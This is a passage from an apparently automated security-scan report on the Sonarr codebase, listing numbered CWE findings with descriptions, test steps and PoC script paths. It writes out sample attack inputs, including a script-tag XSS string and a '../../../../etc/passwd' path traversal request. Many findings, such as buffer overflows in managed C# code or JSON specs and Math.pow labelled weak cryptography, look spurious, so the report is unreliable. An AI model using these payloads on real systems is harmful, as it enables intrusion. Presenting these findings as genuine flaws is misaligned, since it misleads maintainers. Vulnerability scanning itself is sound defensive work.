Passing malformed tags parameter like '1,2,invalid,4' to GetCalendar could cause issues when _tagService.GetTag is called with invalid tag names.

**How to Test:**
1. Call GetCalendar with tags parameter containing invalid tag identifiers
2. Monitor for exceptions or unexpected filtering behavior
3. Verify that invalid tags don't break the entire calendar generation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_Calendar_CalendarControllercs.py`
---

### 697. Cross-site Scripting (CWE-79)

**File:** src/Sonarr.Api.V3/Calendar/CalendarController.cs
**Line:** 51

**Description:**
The calendar controller does not properly sanitize user input when generating JSON responses, potentially allowing XSS attacks through episode data.

**Evidence:**
```
The code directly returns episode data including episode.Overview and series.Network without sanitization in the JSON response.
```

**Impact:**
An attacker could inject malicious JavaScript into episode descriptions or series networks, which would be executed when users view the calendar in the web UI.

**Proof of Concept:**
An attacker could create an episode with overview containing '<script>alert("XSS")</script>' or set a series network to 'Network<script>alert("XSS")</script>'. When the calendar is returned as JSON, this JavaScript would be embedded in the response.

**How to Test:**
1. Create an episode with malicious JavaScript in the overview field
2. Call GetCalendar endpoint
3. Parse the resulting JSON to verify JavaScript execution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_SonarrApiV3_Calendar_CalendarControllercs.py`
---

### 698. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/Config/HostConfigController.cs
**Line:** 100

**Description:**
The IsMatchingPassword method in HostConfigController does not properly validate password confirmation, potentially allowing password changes with mismatched passwords.

**Evidence:**
```
The method checks if user password matches resource password OR if resource password matches password confirmation, but doesn't validate that both passwords match.
```

**Impact:**
An attacker could potentially set a password that doesn't match the confirmation, leading to password reset issues or unauthorized access.

**Proof of Concept:**
Call SaveHostConfig with a password and password confirmation that don't match, but where the user's current password matches the provided password.

**How to Test:**
1. Call SaveHostConfig with mismatched password and password confirmation
2. Verify that the password is accepted despite mismatch
3. Check if the user can log in with the new password

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_Config_HostConfigControllercs.py`
---

### 699. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/Config/NamingConfigController.cs
**Line:** 100

**Description:**
The GetExamples method in NamingConfigController does not validate the input settings before generating examples, potentially leading to exceptions or incorrect examples.

**Evidence:**
```
The method accepts a NamingConfigResource parameter but doesn't validate it before using it to generate examples.
```

**Impact:**
Malformed naming configuration could cause exceptions during example generation, breaking the API endpoint.

**Proof of Concept:**
Call GetExamples with a malformed NamingConfigResource that has invalid format strings, causing validation to fail during example generation.

**How to Test:**
1. Call GetExamples with invalid naming format configurations
2. Monitor for exceptions during example generation
3. Verify that the endpoint returns appropriate error responses

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_Config_NamingConfigControllercs.py`
---

### 700. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/CustomFormats/CustomFormatController.cs
**Line:** 100

**Description:**
The Update method in CustomFormatController does not validate the input before processing, potentially allowing invalid custom format specifications.

**Evidence:**
```
The method accepts a CustomFormatResource and directly converts it to a model without comprehensive validation of the specifications.
```

**Impact:**
Invalid custom format specifications could cause exceptions or unexpected behavior during format processing.

**Proof of Concept:**
Call Update with a CustomFormatResource containing invalid specification data that doesn't match expected schema.

**How to Test:**
1. Call Update with malformed custom format specifications
2. Monitor for exceptions during format processing
3. Verify that invalid formats are properly rejected

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_CustomFormats_CustomFormatControllercs.py`
---

### 701. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/CustomFormats/CustomFormatController.cs
**Line:** 120

**Description:**
The Update method in CustomFormatController does not validate bulk operations properly, potentially allowing invalid bulk updates.

**Evidence:**
```
The method accepts a CustomFormatBulkResource but doesn't validate that the IDs exist or are valid before processing bulk updates.
```

**Impact:**
Invalid bulk update operations could cause exceptions or unexpected behavior in custom format management.

**Proof of Concept:**
Call Update with a CustomFormatBulkResource containing non-existent format IDs or invalid data.

**How to Test:**
1. Call Update with bulk resource containing invalid format IDs
2. Monitor for exceptions during bulk processing
3. Verify that invalid IDs are properly handled

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_CustomFormats_CustomFormatControllercs.py`
---

### 702. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/Episodes/RenameEpisodeController.cs
**Line:** 25

**Description:**
The GetEpisodes method in RenameEpisodeController does not validate the input parameters, potentially leading to unexpected behavior.

**Evidence:**
```
The method accepts seriesId and seasonNumber parameters but doesn't validate that they are within expected ranges or valid.
```

**Impact:**
Invalid parameters could cause exceptions or unexpected behavior in episode renaming operations.

**Proof of Concept:**
Call GetEpisodes with invalid seriesId or seasonNumber values that don't correspond to existing data.

**How to Test:**
1. Call GetEpisodes with invalid seriesId or seasonNumber
2. Monitor for exceptions or unexpected behavior
3. Verify that invalid parameters are properly handled

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_Episodes_RenameEpisodeControllercs.py`
---

### 703. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/Episodes/RenameEpisodeController.cs
**Line:** 35

**Description:**
The GetEpisodes method in RenameEpisodeController does not validate the bulk input parameters, potentially leading to unexpected behavior.

**Evidence:**
```
The method accepts a list of seriesIds but doesn't validate that they are all positive integers or exist.
```

**Impact:**
Invalid bulk parameters could cause exceptions or unexpected behavior in episode renaming operations.

**Proof of Concept:**
Call GetEpisodes with bulk seriesIds containing invalid values like negative numbers or zero.

**How to Test:**
1. Call GetEpisodes with bulk seriesIds containing invalid values
2. Monitor for exceptions or unexpected behavior
3. Verify that invalid IDs are properly handled

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_Episodes_RenameEpisodeControllercs.py`
---

### 704. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/Parse/ParseController.cs
**Line:** 30

**Description:**
The Parse method in ParseController does not validate the input title parameter, potentially leading to unexpected behavior.

**Evidence:**
```
The method checks if title is null or whitespace but doesn't validate the format or content of the title.
```

**Impact:**
Invalid title input could cause parsing issues or unexpected behavior in the parsing service.

**Proof of Concept:**
Call Parse with a title that might cause parsing service to behave unexpectedly.

**How to Test:**
1. Call Parse with various malformed title inputs
2. Monitor for parsing exceptions or unexpected results
3. Verify that the endpoint handles edge cases properly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_Parse_ParseControllercs.py`
---

### 705. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/RootFolders/RootFolderController.cs
**Line:** 45

**Description:**
The GetResourceById method in RootFolderController does not validate the input ID parameter, potentially leading to unexpected behavior.

**Evidence:**
```
The method accepts an ID parameter but doesn't validate that it's a valid positive integer or exists.
```

**Impact:**
Invalid ID input could cause exceptions or unexpected behavior in root folder operations.

**Proof of Concept:**
Call GetResourceById with invalid ID values that don't correspond to existing root folders.

**How to Test:**
1. Call GetResourceById with invalid ID values
2. Monitor for exceptions or unexpected behavior
3. Verify that invalid IDs are properly handled

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_RootFolders_RootFolderControllercs.py`
---

### 706. Improper Input Validation (CWE-20)

**File:** src/Sonarr.Api.V3/ManualImport/ManualImportController.cs
**Line:** 43

**Description:**
The GetMediaFiles method accepts downloadId parameter without validation, which could lead to unexpected behavior when malformed data is passed.

**Evidence:**
```
The method signature accepts downloadId as string parameter but doesn't validate its format or length before passing to service layer.
```

**Impact:**
Malformed downloadId could cause service layer to throw exceptions or behave unexpectedly, potentially leading to information disclosure or denial of service.

**Proof of Concept:**
Call GET /api/v3/manualimport?downloadId=malformed%20download%20id%20with%20spaces

**How to Test:**
1. Send GET request with various malformed downloadId values
2. Check for exception responses or unexpected behavior
3. Monitor service logs for validation errors

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_SonarrApiV3_ManualImport_ManualImportControllercs.py`
---

### 707. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/Sonarr.Api.V3/Commands/CommandController.cs
**Line:** 56

**Description:**
The CommandController lacks CSRF protection for POST operations, making it vulnerable to CSRF attacks.

**Evidence:**
```
The StartCommand method accepts POST requests without validating CSRF tokens, and the controller doesn't implement CSRF validation.
```

**Impact:**
An attacker could trick authenticated users into executing unwanted commands on the Sonarr instance.

**Proof of Concept:**
Create a malicious webpage that submits a command request to Sonarr API without user interaction.

**How to Test:**
1. Access Sonarr API with authenticated session
2. Create a malicious page that submits commands
3. Verify if commands execute without proper CSRF validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_SonarrApiV3_Commands_CommandControllercs.py`
---

### 708. Path Traversal (CWE-22)

**File:** src/Sonarr.Api.V3/ManualImport/ManualImportController.cs
**Line:** 43

**Description:**
The folder parameter in GetMediaFiles method could be vulnerable to path traversal attacks when used in file operations.

**Evidence:**
```
The folder parameter is passed directly to service layer without path validation or sanitization, potentially allowing directory traversal.
```

**Impact:**
An attacker could access files outside the intended directory by manipulating the folder parameter.

**Proof of Concept:**
Call GET /api/v3/manualimport?folder=../../../../etc/passwd

**How to Test:**
1. Send GET request with folder parameter containing path traversal sequences
2. Check if file access is allowed outside intended directories
3. Monitor for unauthorized file reads

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_SonarrApiV3_ManualImport_ManualImportControllercs.py`
---

### 709. Stack-based Buffer Overflow (CWE-121)

**File:** src/Sonarr.Api.V3/Profiles/Quality/QualityProfileResource.cs
**Line:** 100

**Description:**
The ToModel method in QualityProfileResourceMapper could be vulnerable to buffer overflow when handling large quality profile data.

**Evidence:**
```
The method converts collections using ConvertAll which could lead to buffer overflows with large data sets, especially when dealing with quality items.
```

**Impact:**
Large quality profile data could cause memory corruption or application crashes.

**Proof of Concept:**
Create a quality profile with extremely large number of quality items and submit it to the API.

**How to Test:**
1. Create quality profile with large number of items
2. Submit to API endpoint
3. Monitor for crashes or memory issues

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_SonarrApiV3_Profiles_Quality_QualityProfileResourcecs.py`
---

### 710. Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') (CWE-120)

**File:** src/Sonarr.Api.V3/Profiles/Release/ReleaseProfileResource.cs
**Line:** 100

**Description:**
The ParseArray method in RestrictionResourceMapper could be vulnerable to buffer overflow when handling large arrays.

**Evidence:**
```
The ParseArray method processes arrays without checking their size limits, potentially leading to buffer overflows when handling large JSON arrays.
```

**Impact:**
Large arrays in required/ignored fields could cause buffer overflows and application instability.

**Proof of Concept:**
Submit a release profile with very large required/ignored arrays to trigger buffer overflow.

**How to Test:**
1. Create release profile with large arrays in required/ignored fields
2. Submit to API
3. Monitor for buffer overflow conditions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-120_src_SonarrApiV3_Profiles_Release_ReleaseProfileResourcecs.py`
---

### 711. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Test.Common/NzbDroneRunner.cs
**Line:** 100

**Description:**
The GenerateConfigFile method creates API keys using Guid.NewGuid() but doesn't validate or sanitize the generated key before writing to configuration file.

**Evidence:**
```
The API key is generated with: 'var apiKey = Guid.NewGuid().ToString().Replace("-", "");' but there's no validation of the generated key or its length, potentially allowing malformed keys.
```

**Impact:**
While not directly exploitable, improper validation of generated API keys could lead to configuration issues or unexpected behavior in the test environment.

**Proof of Concept:**
If the GUID replacement process fails or produces unexpected results, the API key in the configuration file might not be properly formatted, causing authentication issues.

**How to Test:**
1. Run the GenerateConfigFile method multiple times
2. Verify that all generated API keys are valid and properly formatted
3. Check for any edge cases in GUID generation that might produce invalid keys

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneTestCommon_NzbDroneRunnercs.py`
---

### 712. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Test.Common/NzbDroneRunner.cs
**Line:** 137

**Description:**
The application stores PostgreSQL connection credentials in environment variables without proper encryption or secure handling.

**Evidence:**
```
Environment variables are set with database credentials: 'envVars.Add("Sonarr__Postgres__Password", PostgresOptions.Password);'. These credentials are stored in cleartext in the environment.
```

**Impact:**
If the test environment is compromised, database credentials are exposed in cleartext, potentially allowing unauthorized access to the test database.

**Proof of Concept:**
In a compromised test environment, an attacker could enumerate environment variables and extract the PostgreSQL password from the Sonarr process environment.

**How to Test:**
1. Start a test with PostgreSQL options
2. Check the process environment variables using Process Explorer or similar tools
3. Verify that the PostgreSQL password is visible in cleartext

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneTestCommon_NzbDroneRunnercs.py`
---

### 713. Improper Access Control (CWE-284)

**File:** src/NzbDrone.Test.Common/NzbDroneRunner.cs
**Line:** 147

**Description:**
The application creates temporary directories with default permissions, potentially allowing unauthorized access to test data.

**Evidence:**
```
The AppData directory is created with: 'Directory.CreateDirectory(AppData);' without setting specific permissions. The directory is used for storing test configuration and logs.
```

**Impact:**
Test data and configuration files might be accessible to unauthorized users, potentially exposing sensitive test information or allowing manipulation of test data.

**Proof of Concept:**
Run a test, then check the permissions of the created AppData directory. If it's created with default permissions, other users on the system might be able to read or modify test files.

**How to Test:**
1. Run a test using NzbDroneRunner
2. Check the permissions of the created AppData directory
3. Verify that the directory is accessible to other users in the system

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-284_src_NzbDroneTestCommon_NzbDroneRunnercs.py`
---

### 714. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Test.Common/NzbDroneRunner.cs
**Line:** 62

**Description:**
The application catches InvalidOperationException but doesn't log or handle it properly, potentially masking underlying issues.

**Evidence:**
```
In the Kill method, 'catch (InvalidOperationException)' is used but there's no logging or additional handling of the exception.
```

**Impact:**
When process termination fails due to InvalidOperationException, the failure is silently ignored, potentially leading to test instability or resource leaks.

**Proof of Concept:**
If a process is already terminated when Kill() is called, the InvalidOperationException is caught but not logged, making it difficult to debug test failures.

**How to Test:**
1. Create a scenario where Kill() is called on a process that has already exited
2. Verify that no error is logged about the failed termination
3. Check if test execution continues normally despite the failed termination

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneTestCommon_NzbDroneRunnercs.py`
---

### 715. Cleartext Transmission of Sensitive Information (CWE-319)

**File:** src/NzbDrone.Test.Common/NzbDroneRunner.cs
**Line:** 25

**Description:**
The REST API client uses HTTP instead of HTTPS for API communication, transmitting API keys in cleartext.

**Evidence:**
```
The RestClient is initialized with: 'new RestClient($"http://localhost:{port}/api/v3")'. API keys are sent in headers but the communication channel is not encrypted.
```

**Impact:**
API keys and potentially sensitive data are transmitted over HTTP, making them vulnerable to interception in test environments.

**Proof of Concept:**
If a test environment is monitored or if the test process is running on a network with packet sniffing capabilities, API keys could be captured in cleartext.

**How to Test:**
1. Run a test with network monitoring enabled
2. Capture network traffic during API calls
3. Verify that API keys are transmitted in cleartext over HTTP

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-319_src_NzbDroneTestCommon_NzbDroneRunnercs.py`
---

## Low Severity Vulnerabilities

### 1. Use of Insecure or Weak Cryptographic Algorithms (CWE-1236)

**File:** frontend/src/Settings/Profiles/Quality/QualityProfileItemSize.tsx
**Line:** 100

**Description:**
The slider value calculation uses a custom mathematical transformation (Math.pow(value, 1/1.1)) that might not be the most secure approach for data handling.

**Evidence:**
```
The code uses Math.pow(value, 1/1.1) for slider calculations, which could introduce floating-point precision issues and potential vulnerabilities in calculations.
```

**Impact:**
Potential floating-point precision errors in size calculations, though not directly cryptographic.

**Proof of Concept:**
Extreme values in slider calculations might produce unexpected results due to floating-point arithmetic precision issues.

**How to Test:**
1. Test extreme slider values for precision issues
2. Verify that calculations maintain expected accuracy
3. Check for potential overflow or underflow conditions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-1236_frontend_src_Settings_Profiles_Quality_QualityProfileItemSizetsx.py`
---

### 2. Cleartext Storage of Sensitive Information (CWE-312)

**File:** frontend/src/Settings/Profiles/Quality/EditQualityProfileModalContent.tsx
**Line:** 100

**Description:**
The component stores sensitive profile data in component state without explicit encryption, potentially exposing sensitive information in memory.

**Evidence:**
```
The component uses React state to manage quality profile data, including potentially sensitive configuration values.
```

**Impact:**
Sensitive profile configuration data might be exposed in browser memory or localStorage if not properly handled.

**Proof of Concept:**
If the component state contains sensitive information and is not properly cleared, it could remain in memory after component unmounting.

**How to Test:**
1. Check if sensitive data is stored in component state
2. Verify state cleanup on component unmount
3. Test memory usage patterns for sensitive data

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_frontend_src_Settings_Profiles_Quality_EditQualityProfileModalContenttsx.py`
---

### 3. Path Traversal (CWE-22)

**File:** frontend/src/Calendar/iCal/CalendarLinkModalContent.tsx
**Line:** 105

**Description:**
The iCal URL construction could be vulnerable to path traversal if URL components are not properly sanitized.

**Evidence:**
```
The URL construction uses window.location.host and window.Sonarr.urlBase without validation.
```

**Impact:**
Maliciously crafted URLs could potentially lead to path traversal issues.

**Proof of Concept:**
If window.location.host contains path traversal sequences, it could affect URL construction.

**How to Test:**
1. Set window.location.host to include path traversal sequences
2. Generate iCal URL
3. Verify URL construction and potential path traversal

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_frontend_src_Calendar_iCal_CalendarLinkModalContenttsx.py`
---

### 4. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Common.Test/DiskTests/DiskTransferServiceFixture.cs
**Line:** 105

**Description:**
The test code uses various path operations that could be vulnerable to buffer overflow issues in the underlying implementation.

**Evidence:**
```
The test code extensively uses Path.Combine(), Path.GetDirectoryName(), and other path manipulation functions that could be vulnerable to buffer overflows in the underlying .NET implementation or custom path handling.
```

**Impact:**
Buffer overflow issues in path handling could lead to crashes, memory corruption, or potentially allow attackers to execute arbitrary code through crafted paths.

**Proof of Concept:**
If a very long path string is passed to path manipulation functions, it could potentially cause buffer overflows in the underlying implementation.

**How to Test:**
Test with very long path strings and verify that the system properly handles buffer allocation and overflow conditions. Check that path operations don't exceed buffer limits.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCommonTest_DiskTests_DiskTransferServiceFixturecs.py`
---

### 5. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/AwesomeHD.xml
**Line:** 15

**Description:**
RSS feed contains HTML content that could be vulnerable to log injection

**Evidence:**
```
HTML content in description fields with embedded HTML tags
```

**Impact:**
If RSS feed content is logged without proper sanitization, it could lead to log injection attacks

**Proof of Concept:**
If RSS feed content is logged directly without sanitization, HTML tags could be used to inject malicious content into logs

**How to Test:**
Check if RSS feed content is logged directly without sanitization and verify log output neutralization

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_AwesomeHDxml.py`
---

### 6. Improper Output Neutralization for Logs (CWE-117)

**File:** src/NzbDrone.Core.Test/Files/Indexers/TorrentRss/BitHdtv.xml
**Line:** 30

**Description:**
RSS feed contains HTML content that could be vulnerable to log injection

**Evidence:**
```
HTML content in description fields with embedded HTML tags
```

**Impact:**
If RSS feed content is logged without proper sanitization, it could lead to log injection attacks

**Proof of Concept:**
If RSS feed content is logged directly without sanitization, HTML tags could be used to inject malicious content into logs

**How to Test:**
Check if RSS feed content is logged directly without sanitization and verify log output neutralization

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCoreTest_Files_Indexers_TorrentRss_BitHdtvxml.py`
---

### 7. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core.Test/Messaging/Commands/CommandEqualityComparerFixture.cs
**Line:** 105

**Description:**
While this is test code, the command equality comparison logic could be part of a larger system that might be vulnerable to CSRF attacks.

**Evidence:**
```
The test code doesn't include CSRF protection testing, which might be missing from the actual implementation.
```

**Impact:**
Could lead to unauthorized command execution if CSRF protection isn't properly implemented in the actual system.

**Proof of Concept:**
If commands are processed through web interfaces without proper CSRF tokens, an attacker could forge requests to execute unauthorized commands.

**How to Test:**
1. Test command processing through web interfaces 2. Verify CSRF token implementation 3. Check for proper request validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCoreTest_Messaging_Commands_CommandEqualityComparerFixturecs.py`
---

### 8. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/IndexerSearch/ReleaseSearchService.cs
**Line:** 400

**Description:**
The GetSceneEpisodeMappings method uses string operations that could potentially lead to buffer overflow conditions when processing large numbers of scene mappings.

**Evidence:**
```
The method processes scene mappings and builds lists of SceneEpisodeMapping objects, but doesn't validate the size or number of mappings that could cause memory allocation issues.
```

**Impact:**
Processing a large number of scene mappings could lead to memory exhaustion or buffer overflow conditions, potentially causing application crashes or denial of service.

**Proof of Concept:**
If a series has an extremely large number of scene mappings, the dictionary operations and list building could cause memory allocation issues or stack overflow.

**How to Test:**
1. Create a series with a very large number of scene mappings
2. Trigger a search operation that calls GetSceneEpisodeMappings
3. Monitor for memory allocation issues or crashes
4. Check if proper bounds checking is performed

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_IndexerSearch_ReleaseSearchServicecs.py`
---

### 9. Buffer Copy without Checking Size of Input (CWE-120)

**File:** src/NzbDrone.Core/IndexerSearch/ReleaseSearchService.cs
**Line:** 400

**Description:**
The GetSceneEpisodeMappings method uses dictionary operations that could be vulnerable to buffer overflows when handling large datasets.

**Evidence:**
```
The method uses Dictionary<SceneEpisodeMapping, SceneEpisodeMapping> which could cause issues with large numbers of mappings, potentially leading to buffer overflows during dictionary operations.
```

**Impact:**
Processing large numbers of scene mappings could cause buffer overflow conditions, leading to application crashes or memory corruption.

**Proof of Concept:**
With extremely large scene mapping datasets, dictionary operations could overflow buffers or cause memory allocation failures.

**How to Test:**
1. Create a scenario with extremely large scene mapping data
2. Execute GetSceneEpisodeMappings with large datasets
3. Monitor for buffer overflow conditions
4. Check if memory allocation is properly validated

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-120_src_NzbDroneCore_IndexerSearch_ReleaseSearchServicecs.py`
---

### 10. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/MediaFiles/EpisodeImport/DetectSample.cs
**Line:** 1

**Description:**
While this file doesn't directly handle web requests, the import functionality could be part of a larger system that might be vulnerable to CSRF attacks.

**Evidence:**
```
Import functionality is part of a larger system that could be exposed to web requests without CSRF protection.
```

**Impact:**
CSRF attacks could be possible if this import functionality is exposed through web APIs without proper CSRF token validation.

**Proof of Concept:**
If import functionality is exposed through web APIs, create a malicious request that triggers import operations without proper CSRF tokens.

**How to Test:**
Test web API endpoints that trigger import operations for CSRF token validation and protection.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_MediaFiles_EpisodeImport_DetectSamplecs.py`
---

### 11. Improper Output Neutralization for Logs (CWE-117)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The API specification doesn't define proper logging output neutralization for potentially malicious inputs.

**Evidence:**
```
The API handles various inputs that could be logged, but the specification doesn't define how these inputs should be neutralized when logged, potentially leading to log injection vulnerabilities.
```

**Impact:**
Malicious inputs could be used to inject log entries with special characters or control sequences, potentially affecting log parsing or analysis.

**Proof of Concept:**
If a user provides a title containing log injection sequences like 'INFO: User input: %s' and this gets logged, it could affect log parsing or allow log injection attacks.

**How to Test:**
Test logging behavior with special characters and control sequences in inputs. Verify that log entries are properly neutralized.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_SonarrApiV5_openapijson.py`
---

### 12. Stack-based Buffer Overflow (CWE-121)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
While the JSON schema itself doesn't contain buffer overflow issues, the API specification defines parameters that could be vulnerable to buffer overflows in backend implementations.

**Evidence:**
```
String parameters like 'title', 'overview', 'message' are defined without size limits, which could lead to buffer overflows in backend implementations.
```

**Impact:**
Backend services might be vulnerable to buffer overflows when handling large string inputs, potentially leading to crashes or code execution.

**Proof of Concept:**
Submitting a series title with 1000+ characters might cause buffer overflow in backend services that don't properly validate string lengths.

**How to Test:**
Test API endpoints with very long string inputs to check for potential buffer overflow conditions in backend implementations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_SonarrApiV5_openapijson.py`
---

### 13. Buffer Copy without Checking Size of Input (CWE-120)

**File:** src/Sonarr.Api.V5/openapi.json
**Line:** 1

**Description:**
The API specification defines string parameters without indicating size constraints, which could lead to buffer copy vulnerabilities.

**Evidence:**
```
String parameters like 'title', 'overview', 'message' are defined without size limits, potentially leading to buffer overflows in backend implementations.
```

**Impact:**
Backend services might copy unbounded strings into fixed-size buffers, leading to potential buffer overflows.

**Proof of Concept:**
Sending a request with a very long 'overview' field might cause buffer overflow in backend services that don't validate input size.

**How to Test:**
Test API endpoints with inputs that exceed typical buffer sizes to check for potential buffer overflow conditions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-120_src_SonarrApiV5_openapijson.py`
---

### 14. Stack-based Buffer Overflow (CWE-121)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
While the OpenAPI specification itself doesn't contain buffer overflow code, the structure of parameters could lead to buffer overflow issues in the backend implementation.

**Evidence:**
```
The specification defines many endpoints with parameters that could potentially cause buffer overflows if not properly validated in the backend. For example, the 'seriesId' parameter is defined as integer but could overflow with very large values.
```

**Impact:**
If the backend implementation doesn't properly validate parameter sizes, it could lead to buffer overflows when processing large parameter values, potentially allowing code execution.

**Proof of Concept:**
Sending a request with a very large integer value for 'seriesId' parameter could potentially cause buffer overflow in the backend implementation if not properly validated.

**How to Test:**
Test endpoints with very large parameter values and observe if the backend properly handles them without overflow conditions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_SonarrApiV3_openapijson.py`
---

### 15. Buffer Copy without Checking Size of Input (CWE-120)

**File:** src/Sonarr.Api.V3/openapi.json
**Line:** 1

**Description:**
The API specification defines parameters without size constraints that could lead to buffer overflows in backend implementations.

**Evidence:**
```
Many string parameters in the specification don't define maximum length constraints, which could lead to buffer overflow issues in the backend when processing these inputs.
```

**Impact:**
Backend implementations might not validate string parameter lengths, leading to potential buffer overflows when handling large inputs.

**Proof of Concept:**
Sending a request with extremely long string values for parameters like 'title', 'path', or 'name' could potentially cause buffer overflow issues in the backend implementation.

**How to Test:**
Test endpoints with very long string parameters and verify if the backend properly handles them without buffer overflow conditions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-120_src_SonarrApiV3_openapijson.py`
---

### 16. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Test.Common/ConcurrencyCounter.cs
**Line:** 28

**Description:**
The ConcurrencyCounter class uses a Dictionary with thread IDs as keys but doesn't validate that the thread ID is within expected bounds.

**Evidence:**
```
The dictionary uses 'int' as key type but doesn't validate that thread IDs are within expected ranges or that they're valid.
```

**Impact:**
While not directly exploitable, improper array index validation could lead to unexpected behavior or exceptions in high-concurrency scenarios.

**Proof of Concept:**
In a highly concurrent test environment, if thread IDs are unexpectedly large or negative, the dictionary operations might behave unexpectedly.

**How to Test:**
1. Create a test with extreme concurrency
2. Monitor for any exceptions or unexpected behavior in the ConcurrencyCounter
3. Test with very high thread counts to see if dictionary operations fail

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneTestCommon_ConcurrencyCountercs.py`
---

---

## Additional Notes

